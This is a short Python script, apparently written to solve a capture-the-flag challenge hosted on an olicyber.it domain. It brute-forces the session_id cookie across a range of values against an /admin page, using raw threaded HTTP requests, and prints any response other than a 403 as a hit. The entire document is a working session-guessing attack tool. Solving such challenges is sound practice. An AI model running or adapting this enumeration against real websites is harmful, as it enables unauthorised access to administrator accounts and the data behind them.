from concurrent.futures import ThreadPoolExecutor
import socket
import time

host = "too-small-reminder.challs.olicyber.it"
baseline_length = None

def check(i):
    global baseline_length
    #time.sleep(0.01)

    try:
        req = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"Cookie: session_id={i}\r\n"
            f"\r\n"
        )

        s = socket.socket()
        s.settimeout(2)
        s.connect((host, 80))
        s.send(req.encode())

        response = b""
        timed_out = False

        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                timed_out = True
                break

        s.close()

        # 🚨 NO RESPONSE
        if not response:
            print(f"[NO RESPONSE] {i}")
            return

        res = response.decode(errors="ignore")
        length = len(res)

        # 🚨 PARTIAL RESPONSE
        if timed_out:
            print(f"[PARTIAL / TIMEOUT] {i}")
        else:
            print(f"[OK] {i} Length={length}")

        # baseline
        if baseline_length is None:
            baseline_length = length

        # 🚨 BETTER anomaly detection
        if not res.startswith("HTTP/1.1 403"):
            print("\n[!!!] DIFFERENT RESPONSE FOUND")
            print("ID:", i)
            print("Length:", length)
            print(res[:300])

    except Exception as e:
        print(f"[ERROR] {i} → {e}")

with ThreadPoolExecutor(max_workers=5) as ex: ex.map(check, range(3000, 4000))
